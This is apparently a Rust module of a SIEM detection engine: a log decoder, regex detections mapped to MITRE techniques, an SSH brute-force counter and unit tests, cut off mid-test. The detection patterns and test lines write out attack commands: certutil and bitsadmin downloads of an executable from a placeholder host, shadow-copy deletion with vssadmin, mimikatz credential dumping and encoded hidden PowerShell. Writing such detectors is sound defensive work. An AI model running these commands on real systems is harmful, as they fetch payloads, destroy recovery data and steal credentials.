//! ProVigil in-process detection for siem-api: decodes a log line, checks it against the
//! XML-format rules, the built-in detections and the SSH brute-force counter, and makes the
//! alert. The console's rule list and Logtest page, and Red Swarm, use the same engine.

mod logtest;
mod xml;

use std::collections::{HashMap, HashSet, VecDeque};
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex, MutexGuard, OnceLock, RwLock};

use chrono::{DateTime, Duration, Utc};
use regex::Regex;
use siem_core::{
    AgentAlertInfo, Alert, DecodedFields, DecoderAlertInfo, ManagerAlertInfo, MitreAttack, RawEvent, Rule,
    RuleAlertInfo,
};
use uuid::Uuid;

pub use logtest::{LogtestEngine, LogtestResult};
pub use xml::{parse_rules_xml, XmlRule};

use xml::{decode_xml, parse_decoders_xml, EventCtx, History, Hit, XmlDecoder};

const MEMORY_LIMIT: usize = 50_000;
const MANAGER_NAME: &str = "provigil-manager";

macro_rules! re {
    ($p:expr) => {{
        static R: OnceLock<Regex> = OnceLock::new();
        R.get_or_init(|| Regex::new($p).expect("built-in pattern"))
    }};
}

fn lock<T>(m: &Mutex<T>) -> MutexGuard<'_, T> {
    m.lock().unwrap_or_else(|e| e.into_inner())
}

/// Tactic and technique names for the MITRE ids the engine knows.
fn mitre(id: &str) -> MitreAttack {
    let (tactic, technique) = match id {
        "T1110" => ("Credential Access", "Brute Force"),
        "T1070.001" => ("Defense Evasion", "Clear Windows Event Logs"),
        "T1543.003" => ("Persistence", "Windows Service"),
        "T1490" => ("Impact", "Inhibit System Recovery"),
        "T1547.001" => ("Persistence", "Registry Run Keys / Startup Folder"),
        "T1082" => ("Discovery", "System Information Discovery"),
        "T1098" => ("Persistence", "Account Manipulation"),
        "T1565" => ("Impact", "Data Manipulation"),
        "T1222" => ("Defense Evasion", "File and Directory Permissions Modification"),
        "T1014" => ("Defense Evasion", "Rootkit"),
        "T1564.004" => ("Defense Evasion", "NTFS File Attributes"),
        "T1059.001" => ("Execution", "PowerShell"),
        "T1548" => ("Privilege Escalation", "Abuse Elevation Control Mechanism"),
        "T1486" => ("Impact", "Data Encrypted for Impact"),
        _ => ("", ""),
    };
    MitreAttack { id: id.to_string(), tactic: tactic.to_string(), technique: technique.to_string() }
}

// ---------------------------------------------------------------------------------------
// Syslog header

pub(crate) struct SyslogHeader<'a> {
    pub timestamp: &'a str,
    pub host: &'a str,
    pub program: &'a str,
    pub pid: Option<u32>,
    pub log: &'a str,
}

/// `Mon DD HH:MM:SS host program[pid]: message`, or an ISO date-time in place of the first part.
pub(crate) fn split_syslog(line: &str) -> Option<SyslogHeader<'_>> {
    let c = re!(
        r"(?s)^([A-Za-z]{3}\s+\d{1,2} \d{2}:\d{2}:\d{2}|\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:?\d{2})?) (\S+) ([^\s\[\]:]+)(?:\[(\d+)\])?: ?(.*)$"
    )
    .captures(line)?;
    Some(SyslogHeader {
        timestamp: c.get(1)?.as_str(),
        host: c.get(2)?.as_str(),
        program: c.get(3)?.as_str(),
        pid: c.get(4).and_then(|p| p.as_str().parse().ok()),
        log: c.get(5)?.as_str(),
    })
}

// ---------------------------------------------------------------------------------------
// Built-in decoders

fn first_ipv4(line: &str) -> Option<String> {
    re!(r"\b\d{1,3}(?:\.\d{1,3}){3}\b").find(line).map(|m| m.as_str().to_string())
}

/// The first built-in decoder that recognises `line`.
fn builtin_decode(line: &str) -> Option<DecodedFields> {
    let mut d = DecodedFields::default();
    let named = |d: &mut DecodedFields, name: &str| d.decoder_name = name.to_string();
    if let Some(c) =
        re!(r"(?i)\b(?:failed|accepted|invalid user)\b.*\bfrom (\d{1,3}(?:\.\d{1,3}){3}) port (\d+)").captures(line)
    {
        named(&mut d, "sshd-auth");
        d.src_ip = Some(c[1].to_string());
        d.src_port = c[2].parse().ok();
        d.user = re!(r"(?i)(?:password for (?:invalid user )?|invalid user |publickey for )(\S+)")
            .captures(line)
            .map(|u| u[1].to_string());
    } else if let Some(c) = re!(r"(?i)File '([^']+)' (modified|added|deleted|checksum changed)").captures(line) {
        named(&mut d, "syscheck-fim");
        d.file_path = Some(c[1].to_string());
        d.action = Some(c[2].to_lowercase());
    } else if let Some(c) = re!(r"(?i)Registry '([^']+)' (modified|added|deleted|value changed)").captures(line) {
        named(&mut d, "windows-registry");
        d.file_path = Some(c[1].to_string());
        d.action = Some(c[2].to_lowercase());
    } else if let Some(c) = re!(r"(?i)Windows-Event \[([^\]]+)\] EventID:\s*(\d+).*?User:\s*(\S+)").captures(line) {
        named(&mut d, "windows-eventchannel");
        d.user = Some(c[3].to_string());
        d.extra.insert("channel".into(), c[1].to_string());
        d.extra.insert("event_id".into(), c[2].to_string());
    } else if let Some(c) = re!(r"(?i)SCA \[(FAIL|PASS)\]:\s*(.+)").captures(line) {
        named(&mut d, "windows-sca");
        d.status = Some(c[1].to_uppercase());
        d.extra.insert("check".into(), c[2].trim().to_string());
    } else if let Some(c) = re!(r"(?i)(\S+) : .*COMMAND=(\S+)").captures(line) {
        named(&mut d, "sudo-cmd");
        d.user = Some(c[1].to_string());
        d.file_path = Some(c[2].to_string());
    } else {
        // shortcut: the path stops at the first space, upgrade if paths with spaces need decoding.
        let c = re!(r"(?i)Process Create:\s*(\S+).*?User:\s*(\S+)").captures(line)?;
        named(&mut d, "windows-sysmon");
        d.file_path = Some(c[1].to_string());
        d.user = Some(c[2].to_string());
    }
    Some(d)
}

// ---------------------------------------------------------------------------------------
// Built-in detections

struct Detection {
    id: u32,
    level: u8,
    description: &'static str,
    pattern: &'static str,
    groups: &'static [&'static str],
    mitre: Option<&'static str>,
}

const DETECTIONS: &[Detection] = &[
    Detection { id: 5710, level: 5, description: "sshd: Attempt to log in with a user that does not exist", pattern: r"(?i)invalid user \S+ from \d", groups: &["syslog", "sshd", "invalid_login"], mitre: Some("T1110") },
    Detection { id: 60101, level: 6, description: "Windows: Logon failure", pattern: r"(?i)eventid\s*[:=]\s*4625\b|an account failed to log on", groups: &["windows", "security", "authentication_failed"], mitre: Some("T1110") },
    Detection { id: 60102, level: 12, description: "Windows: The audit log was cleared", pattern: r"(?i)eventid\s*[:=]\s*1102\b|the audit log was cleared", groups: &["windows", "security", "log_cleared"], mitre: Some("T1070.001") },
    Detection { id: 60103, level: 10, description: "Windows: A new service was installed", pattern: r"(?i)eventid\s*[:=]\s*7045\b|a service was installed in the system", groups: &["windows", "system", "persistence"], mitre: Some("T1543.003") },
    Detection { id: 60104, level: 13, description: "Windows: Shadow copy deletion or download with a system tool", pattern: r"(?i)vssadmin.*delete\s+shadows|certutil.*-urlcache|bitsadmin.*/transfer", groups: &["windows", "execution", "defense_evasion"], mitre: Some("T1490") },
    Detection { id: 60200, level: 11, description: "Windows: Autostart registry key changed", pattern: r"(?i)Registry '[^']*(?:CurrentVersion\\Run|Winlogon)[^']*' (?:modified|added|deleted|value changed)", groups: &["windows", "registry", "persistence"], mitre: Some("T1547.001") },
    Detection { id: 60300, level: 8, description: "Windows: Configuration assessment check failed", pattern: r"(?i)SCA \[FAIL\]:\s*\S", groups: &["windows", "sca", "compliance"], mitre: Some("T1082") },
    Detection { id: 5503, level: 12, description: "File integrity: Critical system file changed", pattern: r"(?i)File '(?:/etc/shadow|/etc/passwd|/etc/sudoers|C:\\Windows\\System32\\drivers\\etc\\hosts)' (?:modified|checksum changed)", groups: &["syscheck", "fim", "tampering"], mitre: Some("T1098") },
    Detection { id: 5501, level: 7, description: "File integrity: File changed", pattern: r"(?i)File '[^']*' (?:modified|added|deleted)", groups: &["syscheck", "fim"], mitre: Some("T1565") },
    Detection { id: 556, level: 3, description: "File integrity: Scan started", pattern: r"(?i)file integrity monitoring scan started", groups: &["syscheck", "fim", "scan_lifecycle"], mitre: None },
    Detection { id: 557, level: 3, description: "File integrity: Scan ended", pattern: r"(?i)file integrity monitoring scan ended", groups: &["syscheck", "fim", "scan_lifecycle"], mitre: None },
    Detection { id: 5541, level: 8, description: "File integrity: Permissions changed", pattern: r"(?i)permissions changed for", groups: &["syscheck", "fim", "permission_tampering"], mitre: Some("T1222") },
    Detection { id: 5542, level: 8, description: "File integrity: Ownership changed", pattern: r"(?i)ownership changed for", groups: &["syscheck", "fim", "ownership_tampering"], mitre: Some("T1222") },
    Detection { id: 51001, level: 13, description: "Rootcheck: Known trojan or rootkit signature detected", pattern: r"(?i)rootcheck: known trojan/rootkit signature detected", groups: &["rootcheck", "malware"], mitre: Some("T1014") },
    Detection { id: 51002, level: 11, description: "Rootcheck: NTFS alternate data stream found", pattern: r"(?i)rootcheck: ntfs alternate data stream found", groups: &["rootcheck", "defense_evasion"], mitre: Some("T1564.004") },
    Detection { id: 60100, level: 14, description: "Windows: Suspicious PowerShell or credential theft tool", pattern: r"(?i)powershell.*(?:-enc|-nop|-w hidden)|mimikatz|sekurlsa::logonpasswords", groups: &["windows", "powershell", "execution"], mitre: Some("T1059.001") },
    Detection { id: 5402, level: 9, description: "sudo: Command run to get a root shell", pattern: r"(?i)sudo:\s*\S+ : .*COMMAND=(?:/usr/bin/su|/bin/bash|/bin/sh)\b", groups: &["syslog", "sudo", "privilege_escalation"], mitre: Some("T1548") },
    Detection { id: 70010, level: 15, description: "Ransomware: Encrypted file extension seen", pattern: r"(?i)\.(?:locked|crypt|encrypted|crypted|wnry)\b", groups: &["malware", "ransomware", "impact"], mitre: Some("T1486") },
];

const BRUTE_FORCE_ID: u32 = 5712;
const BRUTE_FORCE_LIMIT: usize = 4;
const BRUTE_FORCE_GROUPS: [&str; 3] = ["syslog", "sshd", "authentication_failed"];

fn detection_regexes() -> &'static [Regex] {
    static R: OnceLock<Vec<Regex>> = OnceLock::new();
    R.get_or_init(|| DETECTIONS.iter().map(|d| Regex::new(d.pattern).expect("built-in pattern")).collect())
}

fn builtin_detection(line: &str) -> Option<RuleAlertInfo> {
    let d = DETECTIONS.iter().zip(detection_regexes()).find(|(_, re)| re.is_match(line))?.0;
    Some(RuleAlertInfo {
        id: d.id,
        level: d.level,
        description: d.description.to_string(),
        groups: d.groups.iter().map(|g| g.to_string()).collect(),
        mitre: d.mitre.map(mitre),
    })
}

// ---------------------------------------------------------------------------------------
// Ruleset folder

fn find_ruleset() -> Option<PathBuf> {
    let from_env = ["PROVIGIL_RULESET_PATH", "WAZUH_RULESET_PATH"].into_iter().filter_map(std::env::var_os).map(PathBuf::from);
    let local = ["ruleset", "../ruleset", "../../ruleset"].into_iter().map(PathBuf::from);
    from_env.chain(local).find(|p| p.join("rules").is_dir() || p.join("decoders").is_dir())
}

/// The `.xml` files of `dir`, in file-name order.
fn xml_files(dir: &Path) -> Vec<String> {
    let mut paths: Vec<PathBuf> = std::fs::read_dir(dir)
        .map(|it| it.flatten().map(|e| e.path()).collect())
        .unwrap_or_default();
    paths.retain(|p| p.extension().is_some_and(|e| e.eq_ignore_ascii_case("xml")) && p.is_file());
    paths.sort_by(|a, b| a.file_name().cmp(&b.file_name()));
    paths.iter().filter_map(|p| std::fs::read(p).ok()).map(|b| String::from_utf8_lossy(&b).into_owned()).collect()
}

fn load_ruleset(dir: &Path) -> (Vec<XmlDecoder>, Vec<XmlRule>) {
    let decoders = xml_files(&dir.join("decoders")).iter().flat_map(|x| parse_decoders_xml(x)).collect();
    let rules = xml_files(&dir.join("rules")).iter().flat_map(|x| parse_rules_xml(x)).collect();
    (decoders, rules)
}

// ---------------------------------------------------------------------------------------
// Engine

/// How an event was decoded.
pub(crate) struct Decoding {
    pub decoded: DecodedFields,
    /// decoder names for `decoded_as`
    pub chain: Vec<String>,
    /// fields from the XML decoders
    pub xml_fields: HashMap<String, String>,
}

struct Inner {
    decoders: Vec<XmlDecoder>,
    rules: Vec<XmlRule>,
    custom: RwLock<Vec<XmlRule>>,
    memory: Mutex<VecDeque<Hit>>,
    failures: Mutex<HashMap<String, Vec<DateTime<Utc>>>>,
}

/// The detection engine. Clones share the rules deployed at run time and the correlation memory.
#[derive(Clone)]
pub struct AnalysisEngine {
    inner: Arc<Inner>,
}

impl Default for AnalysisEngine {
    fn default() -> Self {
        Self::new()
    }
}

impl AnalysisEngine {
    /// Built-in decoders and detections, plus the ruleset folder's XML decoders and rules when one is found.
    pub fn new() -> Self {
        Self::with_ruleset(find_ruleset().as_deref())
    }

    fn with_ruleset(dir: Option<&Path>) -> Self {
        let (decoders, rules) = dir.map(load_ruleset).unwrap_or_default();
        AnalysisEngine {
            inner: Arc::new(Inner {
                decoders,
                rules,
                custom: RwLock::new(Vec::new()),
                memory: Mutex::new(VecDeque::new()),
                failures: Mutex::new(HashMap::new()),
            }),
        }
    }

    /// Replaces the rules deployed at run time; every clone sees them at once.
    pub fn set_custom_rules_xml(&self, xml: &str) {
        *self.inner.custom.write().unwrap_or_else(|e| e.into_inner()) = parse_rules_xml(xml);
    }

    /// Every active rule: built-in, from the ruleset folder and deployed at run time.
    pub fn list_rules(&self) -> Vec<Rule> {
        let mut out: Vec<Rule> = DETECTIONS
            .iter()
            .map(|d| Rule {
                id: d.id,
                level: d.level,
                description: d.description.to_string(),
                regex_pattern: d.pattern.to_string(),
                groups: d.groups.iter().map(|g| g.to_string()).collect(),
                mitre: d.mitre.map(mitre),
            })
            .collect();
        let brute = brute_force_info(BRUTE_FORCE_LIMIT);
        out.push(Rule {
            id: brute.id,
            level: brute.level,
            description: "sshd: Multiple failed login attempts - Potential Brute-Force Attack".into(),
            regex_pattern: "(?i)failed password|invalid user".into(),
            groups: brute.groups,
            mitre: brute.mitre,
        });
        let custom = self.inner.custom.read().unwrap_or_else(|e| e.into_inner());
        out.extend(self.inner.rules.iter().chain(custom.iter()).map(|r| Rule {
            id: r.id,
            level: r.level,
            description: r.description.clone(),
            regex_pattern: r.pattern_text(),
            groups: r.groups.clone(),
            mitre: r.mitre_ids.first().map(|m| mitre(m)),
        }));
        out
    }

    pub(crate) fn decode(&self, line: &str) -> Decoding {
        let header = split_syslog(line);
        let program = header.as_ref().map(|h| h.program);
        let log = header.as_ref().map_or(line, |h| h.log);
        let mut decoded = builtin_decode(line).unwrap_or_default();
        decoded.program_name = program.map(str::to_string);
        decoded.process_id = header.as_ref().and_then(|h| h.pid);
        let mut chain = Vec::new();
        if !decoded.decoder_name.is_empty() {
            chain.push(decoded.decoder_name.clone());
        }
        let mut xml_fields = HashMap::new();
        if let Some((names, fields)) = decode_xml(&self.inner.decoders, program, log) {
            for (k, v) in &fields {
                match k.as_str() {
                    "srcip" => fill(&mut decoded.src_ip, v),
                    "dstip" => fill(&mut decoded.dst_ip, v),
                    "srcport" => decoded.src_port = decoded.src_port.or(v.parse().ok()),
                    "dstport" => decoded.dst_port = decoded.dst_port.or(v.parse().ok()),
                    "user" | "srcuser" | "dstuser" => fill(&mut decoded.user, v),
                    _ => {}
                }
                decoded.extra.insert(k.clone(), v.clone());
            }
            if decoded.decoder_name.is_empty() {
                decoded.decoder_name = names[0].clone();
            }
            chain.extend(names);
            xml_fields = fields;
        }
        if decoded.decoder_name.is_empty() {
            decoded.decoder_name = "generic-syslog".into();
            decoded.src_ip = first_ipv4(line);
            chain.push(decoded.decoder_name.clone());
        }
        Decoding { decoded, chain, xml_fields }
    }

    /// Checks one event; returns the alert it makes, if any.
    pub fn process_event(&self, event: &RawEvent, agent_name: &str, agent_ip: &str) -> Option<Alert> {
        let line = event.message.as_str();
        let lower = line.to_lowercase();
        let now = event.timestamp;
        let Decoding { decoded, chain, xml_fields } = self.decode(line);

        let fields = field_map(&decoded);
        let src_ip = decoded.src_ip.clone().or_else(|| fields.get("srcip").cloned()).unwrap_or_else(|| agent_ip.to_string());
        let user = decoded.user.clone().or_else(|| fields.get("dstuser").or_else(|| fields.get("srcuser")).cloned());

        let xml_hit = {
            let custom = self.inner.custom.read().unwrap_or_else(|e| e.into_inner());
            let stored_now = Utc::now();
            let mut ids = Vec::new();
            let mut groups = HashSet::new();
            let mut best: Option<&XmlRule> = None;
            for rule in self.inner.rules.iter().chain(custom.iter()) {
                let ctx = EventCtx {
                    log: line,
                    lower: &lower,
                    decoders: &chain,
                    fields: &fields,
                    matched_ids: &ids,
                    matched_groups: &groups,
                    history: Some(History { hits: &self.inner.memory, now, stored_now, agent: &event.agent_id, src_ip: &src_ip, user: user.as_deref() }),
                };
                if !rule.eval(&ctx) {
                    continue;
                }
                ids.push(rule.id);
                groups.extend(rule.groups.iter().cloned());
                let mut memory = lock(&self.inner.memory);
                memory.push_back(Hit {
                    at: now,
                    stored: stored_now,
                    agent: event.agent_id.clone(),
                    rule_id: rule.id,
                    groups: rule.groups.clone(),
                    src_ip: src_ip.clone(),
                    user: user.clone(),
                });
                if memory.len() > MEMORY_LIMIT {
                    memory.pop_front();
                }
                if !rule.noalert && best.is_none_or(|b| rule.level >= b.level) {
                    best = Some(rule);
                }
            }
            best.filter(|r| r.level > 0).map(|r| RuleAlertInfo {
                id: r.id,
                level: r.level,
                description: r.description.clone(),
                groups: r.groups.clone(),
                mitre: r.mitre_ids.first().map(|m| mitre(m)),
            })
        };

        let brute = self.brute_force(&lower, decoded.src_ip.as_deref(), now);
        let rule = brute.or(xml_hit).or_else(|| builtin_detection(line))?;
        Some(Alert {
            id: Uuid::new_v4(),
            timestamp: Utc::now(),
            rule,
            agent: AgentAlertInfo { id: event.agent_id.clone(), name: agent_name.to_string(), ip: agent_ip.to_string() },
            manager: Some(ManagerAlertInfo { name: MANAGER_NAME.into() }),
            decoder: Some(DecoderAlertInfo { name: decoded.decoder_name.clone() }),
            full_log: line.to_string(),
            decoded,
            location: event.location.clone(),
            data: xml_fields.into_iter().map(|(k, v)| (k, serde_json::Value::String(v))).collect(),
        })
    }

    /// Counts an SSH failure for `src_ip`; the 4th within 5 minutes makes the alert.
    fn brute_force(&self, lower: &str, src_ip: Option<&str>, now: DateTime<Utc>) -> Option<RuleAlertInfo> {
        if !(lower.contains("failed password") || lower.contains("invalid user")) {
            return None;
        }
        let ip = src_ip?;
        let window = Duration::minutes(5);
        let mut failures = lock(&self.inner.failures);
        if failures.len() > 10_000 {
            failures.retain(|_, v| v.last().is_some_and(|t| now - *t <= window));
        }
        let list = failures.entry(ip.to_string()).or_default();
        list.retain(|t| *t <= now && now - *t <= window);
        list.push(now);
        if list.len() < BRUTE_FORCE_LIMIT {
            return None;
        }
        let n = list.len();
        failures.remove(ip);
        Some(brute_force_info(n))
    }
}

fn brute_force_info(n: usize) -> RuleAlertInfo {
    RuleAlertInfo {
        id: BRUTE_FORCE_ID,
        level: 10,
        description: format!(
            "sshd: Multiple failed login attempts ({n} attempts detected) - Potential Brute-Force Attack"
        ),
        groups: BRUTE_FORCE_GROUPS.iter().map(|g| g.to_string()).collect(),
        mitre: Some(mitre("T1110")),
    }
}

fn fill(slot: &mut Option<String>, v: &str) {
    if slot.is_none() {
        *slot = Some(v.to_string());
    }
}

/// The decoded fields by the names rules use.
fn field_map(d: &DecodedFields) -> HashMap<String, String> {
    let mut m = d.extra.clone();
    let named = [
        ("srcip", d.src_ip.clone()),
        ("dstip", d.dst_ip.clone()),
        ("srcport", d.src_port.map(|p| p.to_string())),
        ("dstport", d.dst_port.map(|p| p.to_string())),
        ("user", d.user.clone()),
        ("program_name", d.program_name.clone()),
        ("file_path", d.file_path.clone()),
        ("action", d.action.clone()),
        ("status", d.status.clone()),
    ];
    for (k, v) in named {
        if let Some(v) = v {
            m.entry(k.to_string()).or_insert(v);
        }
    }
    m
}

#[cfg(test)]
mod tests {
    use super::*;
    use siem_core::EventSource;

    fn engine() -> AnalysisEngine {
        AnalysisEngine::with_ruleset(None)
    }

    fn event(line: &str) -> RawEvent {
        RawEvent::new("001", EventSource::Syslog, "/var/log/test", line)
    }

    fn fire(eng: &AnalysisEngine, line: &str) -> Option<Alert> {
        eng.process_event(&event(line), "web01", "10.0.0.5")
    }

    fn fired_id(eng: &AnalysisEngine, line: &str) -> Option<u32> {
        fire(eng, line).map(|a| a.rule.id)
    }

    #[test]
    fn builtin_decoders() {
        let d = builtin_decode("Failed password for root from 192.168.1.20 port 51022 ssh2").unwrap();
        assert_eq!(d.decoder_name, "sshd-auth");
        assert_eq!((d.user.as_deref(), d.src_ip.as_deref(), d.src_port), (Some("root"), Some("192.168.1.20"), Some(51022)));
        let d = builtin_decode("Invalid user bob from 10.1.1.1 port 22").unwrap();
        assert_eq!((d.decoder_name.as_str(), d.user.as_deref()), ("sshd-auth", Some("bob")));

        let d = builtin_decode("File '/etc/hosts' checksum changed").unwrap();
        assert_eq!((d.decoder_name.as_str(), d.file_path.as_deref(), d.action.as_deref()), ("syscheck-fim", Some("/etc/hosts"), Some("checksum changed")));

        let d = builtin_decode(r"Registry 'HKLM\Software\Foo' value changed").unwrap();
        assert_eq!((d.decoder_name.as_str(), d.file_path.as_deref(), d.action.as_deref()), ("windows-registry", Some(r"HKLM\Software\Foo"), Some("value changed")));

        let d = builtin_decode("Windows-Event [Security] EventID:4624 logon User:alice").unwrap();
        assert_eq!((d.decoder_name.as_str(), d.user.as_deref()), ("windows-eventchannel", Some("alice")));
        assert_eq!((d.extra["channel"].as_str(), d.extra["event_id"].as_str()), ("Security", "4624"));

        let d = builtin_decode("SCA [PASS]: Ensure firewall is on").unwrap();
        assert_eq!((d.decoder_name.as_str(), d.status.as_deref(), d.extra["check"].as_str()), ("windows-sca", Some("PASS"), "Ensure firewall is on"));

        let d = builtin_decode("sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt").unwrap();
        assert_eq!((d.decoder_name.as_str(), d.user.as_deref(), d.file_path.as_deref()), ("sudo-cmd", Some("alice"), Some("/usr/bin/apt")));

        let d = builtin_decode(r"Process Create: C:\Windows\notepad.exe Parent: explorer.exe User: CORP\amy").unwrap();
        assert_eq!((d.decoder_name.as_str(), d.file_path.as_deref(), d.user.as_deref()), ("windows-sysmon", Some(r"C:\Windows\notepad.exe"), Some(r"CORP\amy")));

        assert!(builtin_decode("hello world").is_none());
        let dec = engine().decode("connection from 172.16.0.4 refused");
        assert_eq!((dec.decoded.decoder_name.as_str(), dec.decoded.src_ip.as_deref()), ("generic-syslog", Some("172.16.0.4")));
    }

    #[test]
    fn builtin_detections() {
        let cases: &[(&str, u32)] = &[
            ("Invalid user bob from 10.1.1.1 port 22", 5710),
            ("Windows-Event [Security] EventID: 4625 bad logon User:bob", 60101),
            ("An account failed to log on", 60101),
            ("Windows-Event [Security] EventID=1102", 60102),
            ("The audit log was cleared", 60102),
            ("EventID:7045 A service was installed in the system", 60103),
            ("vssadmin.exe Delete Shadows /all /quiet", 60104),
            ("certutil.exe -urlcache -split -f http://x/a.exe", 60104),
            ("bitsadmin /transfer job http://x/a.exe c:\\a.exe", 60104),
            (r"Registry 'HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce\evil' added", 60200),
            (r"Registry 'HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell' value changed", 60200),
            ("SCA [FAIL]: Ensure SMBv1 is disabled", 60300),
            ("File '/etc/shadow' modified", 5503),
            (r"File 'C:\Windows\System32\drivers\etc\hosts' checksum changed", 5503),
            ("File '/tmp/report.txt' added", 5501),
            ("File integrity monitoring scan started", 556),
            ("File integrity monitoring scan ended", 557),
            ("Permissions changed for /etc/ssh/sshd_config", 5541),
            ("Ownership changed for /etc/ssh/sshd_config", 5542),
            ("rootcheck: Known trojan/rootkit signature detected in /bin/ls", 51001),
            ("rootcheck: NTFS Alternate Data Stream found: C:\\x:hidden", 51002),
            ("powershell.exe -NoP -W Hidden -Enc SQBFAFgA", 60100),
            ("invoke mimikatz now", 60100),
            ("sekurlsa::logonpasswords", 60100),
            ("sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash", 5402),
            ("renamed C:\\data\\budget.xlsx.wnry", 70010),
        ];
        let eng = engine();
        for (line, id) in cases {
            assert_eq!(fired_id(&eng, line), Some(*id), "{line}");
        }
        assert_eq!(fired_id(&eng, "nothing to see here"), None);

        let a = fire(&eng, "The audit log was cleared").unwrap();
        assert_eq!(a.rule.level, 12);
        assert_eq!(a.rule.groups, ["windows", "security", "log_cleared"]);
        let m = a.rule.mitre.unwrap();
        assert_eq!((m.id.as_str(), m.tactic.as_str()), ("T1070.001", "Defense Evasion"));
        assert_eq!((a.agent.id.as_str(), a.agent.name.as_str(), a.agent.ip.as_str()), ("001", "web01", "10.0.0.5"));
        assert_eq!(a.manager.unwrap().name, "provigil-manager");
        assert_eq!(a.location, "/var/log/test");
        assert_eq!(a.full_log, "The audit log was cleared");
        assert!(fire(&eng, "File integrity monitoring scan started").unwrap().rule.mitre.is_none());
    }

    #[test]
    fn brute_force() {
        let eng = engine();
        let at = |ip: &str, mins: i64| {
            let mut e = event(&format!("Failed password for root from {ip} port 4000 ssh2"));
            e.timestamp = Utc::now() - Duration::minutes(mins);
            eng.process_event(&e, "web01", "10.0.0.5")
        };
        // old failures do not count
        for _ in 0..3 {
            assert!(at("1.1.1.1", 10).is_none());
        }
        for _ in 0..3 {
            assert!(at("1.1.1.1", 0).is_none());
        }
        // another IP counts apart
        assert!(at("2.2.2.2", 0).is_none());
        let a = at("1.1.1.1", 0).unwrap();
        assert_eq!((a.rule.id, a.rule.level), (5712, 10));
        assert!(a.rule.description.contains("(4 attempts detected)"));
        assert_eq!(a.rule.groups, ["syslog", "sshd", "authentication_failed"]);
        assert_eq!(a.rule.mitre.unwrap().technique, "Brute Force");
        // the count starts again
        assert!(at("1.1.1.1", 0).is_none());
    }

    #[test]
    fn brute_force_beats_other_rules() {
        let eng = engine();
        eng.set_custom_rules_xml(r#"<rule id="100" level="15"><match>invalid user</match></rule>"#);
        for _ in 0..3 {
            assert_eq!(fired_id(&eng, "Invalid user bob from 3.3.3.3 port 22"), Some(100));
        }
        assert_eq!(fired_id(&eng, "Invalid user bob from 3.3.3.3 port 22"), Some(5712));
    }

    #[test]
    fn xml_rule_chain_and_selection() {
        let eng = engine();
        eng.set_custom_rules_xml(
            r#"<group name="app,">
                 <rule id="1000" level="0"><match>app:</match></rule>
                 <rule id="1001" level="5"><if_sid>1000</if_sid><match>error|fatal</match>
                   <description>App error</description><mitre><id>T1490</id></mitre></rule>
                 <rule id="1002" level="7"><if_group>app</if_group><regex>code=5\d\d</regex></rule>
                 <rule id="1003" level="12" noalert="1"><if_sid>1000</if_sid><match>fatal</match></rule>
                 <rule id="1004" level="7"><if_sid>1001</if_sid><match>disk</match></rule>
                 <rule id="1005" level="9"><field name="win.eventdata.status">^FAIL$</field></rule>
               </group>"#,
        );
        // parent chain and match alternatives
        let a = fire(&eng, "app: fatal").unwrap();
        assert_eq!((a.rule.id, a.rule.description.as_str()), (1001, "App error"));
        assert_eq!(a.rule.groups, ["app"]);
        assert_eq!(a.rule.mitre.unwrap().id, "T1490");
        // parent group and regex
        assert_eq!(fired_id(&eng, "app: ok code=503"), Some(1002));
        // highest level wins; a tie goes to the later rule
        assert_eq!(fired_id(&eng, "app: error code=500"), Some(1002));
        assert_eq!(fired_id(&eng, "app: error disk code=500"), Some(1004));
        // without the parent nothing fires; level 0 gives no alert
        assert_eq!(fired_id(&eng, "error code=500"), None);
        assert_eq!(fired_id(&eng, "app: nothing"), None);
        // field condition, found by its last part
        assert_eq!(fired_id(&eng, "SCA [FAIL]: Ensure SMBv1 is disabled"), Some(1005));
    }

    #[test]
    fn level_zero_ruleset_match_does_not_hide_builtin() {
        let eng = engine();
        eng.set_custom_rules_xml(r#"<rule id="1" level="0"><match>audit log</match></rule>"#);
        assert_eq!(fired_id(&eng, "The audit log was cleared"), Some(60102));
    }

    #[test]
    fn frequency_same_source_ip() {
        let eng = engine();
        eng.set_custom_rules_xml(
            r#"<rule id="2000" level="3"><match>denied</match></rule>
               <rule id="2001" level="10" frequency="3" timeframe="60">
                 <if_matched_sid>2000</if_matched_sid><same_source_ip/><description>Repeated denials</description>
               </rule>"#,
        );
        let line = |ip: &str| format!("denied connection from {ip}");
        assert_eq!(fired_id(&eng, &line("5.5.5.5")), Some(2000));
        assert_eq!(fired_id(&eng, &line("5.5.5.5")), Some(2000));
        assert_eq!(fired_id(&eng, &line("6.6.6.6")), Some(2000));
        assert_eq!(fired_id(&eng, &line("5.5.5.5")), Some(2001));
        // an event that is not one of those counted does not fire it
        assert_eq!(fired_id(&eng, "accepted connection from 5.5.5.5"), None);
        // a different agent counts apart
        let e = RawEvent::new("002", EventSource::Syslog, "x", line("5.5.5.5"));
        assert_eq!(eng.process_event(&e, "b", "10.0.0.6").unwrap().rule.id, 2000);
        // matches outside the timeframe do not count
        let mut old = RawEvent::new("003", EventSource::Syslog, "x", line("7.7.7.7"));
        old.timestamp = Utc::now() - Duration::minutes(10);
        eng.process_event(&old, "c", "10.0.0.7");
        eng.process_event(&old, "c", "10.0.0.7");
        let e = RawEvent::new("003", EventSource::Syslog, "x", line("7.7.7.7"));
        assert_eq!(eng.process_event(&e, "c", "10.0.0.7").unwrap().rule.id, 2000);
    }

    #[test]
    fn frequency_window_by_time_stored() {
        let eng = engine();
        eng.set_custom_rules_xml(
            r#"<rule id="2000" level="3"><match>denied</match></rule>
               <rule id="2001" level="10" frequency="2" timeframe="60"><if_matched_sid>2000</if_matched_sid></rule>"#,
        );
        // a backlog sent late (event time an hour ago) still correlates
        let mut old = event("denied");
        old.timestamp = Utc::now() - Duration::hours(1);
        assert_eq!(eng.process_event(&old, "a", "1").unwrap().rule.id, 2000);
        assert_eq!(eng.process_event(&old, "a", "1").unwrap().rule.id, 2001);
        // hits stored before the window are not looked at
        lock(&eng.inner.memory).iter_mut().for_each(|h| h.stored -= Duration::minutes(5));
        assert_eq!(eng.process_event(&old, "a", "1").unwrap().rule.id, 2000);
    }

    #[test]
    fn runtime_rules_replace_and_are_shared() {
        let eng = engine();
